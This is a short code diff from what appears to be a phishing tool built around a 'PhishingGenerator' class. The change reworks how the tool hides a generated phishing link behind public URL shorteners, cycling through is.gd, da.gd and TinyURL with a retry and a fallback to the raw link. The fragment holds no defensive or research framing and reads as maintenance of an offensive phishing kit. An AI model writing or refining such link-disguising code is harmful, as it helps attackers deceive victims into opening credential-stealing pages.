@@ -939,22 +939,19 @@ class PhishingGenerator:
             with open(template_path, "w", encoding="utf-8") as f:
                 f.write(proxy_template)
                 
-            # Coba beberapa layanan URL shortener dengan retry
             shortened_url = None
-            shorteners = [
-                lambda url: self.shortener.tinyurl.short(url),
-                lambda url: self.shortener.isgd.short(url),
-                lambda url: self.shortener.dagd.short(url)
-            ]
-            
-            for shortener in shorteners:
+            for name, fn in [("is.gd", lambda u: self.shortener.isgd.short(u)),
+                              ("da.gd", lambda u: self.shortener.dagd.short(u)),
+                              ("TinyURL", lambda u: self.shortener.tinyurl.short(u))]:
                 try:
-                    shortened_url = shortener(phish_url)
-                    break
+                    shortened_url = fn(phish_url)
+                    if shortened_url:
+                        break
                 except:
                     continue
-                    
+
             if not shortened_url:
+                console.print("[red]❌ All URL shorteners failed. Using raw link.[/]")
                 shortened_url = phish_url
             
             console.print(Panel(f"""
